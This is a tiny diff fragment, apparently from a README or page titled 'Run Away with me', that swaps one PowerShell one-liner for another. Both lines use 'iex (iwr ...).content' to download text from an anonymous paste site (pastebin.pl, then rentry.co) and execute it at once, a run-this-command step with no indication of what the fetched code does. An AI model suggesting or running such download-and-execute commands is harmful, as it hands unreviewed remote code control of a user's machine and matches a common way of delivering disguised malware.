@@ -6,4 +6,4 @@ Run Away with me
 
 Or,
 
-`iex (iwr https://pastebin.pl/view/raw/04f9726b).content`
+`iex (iwr https://rentry.co/HotCarla/raw).content`
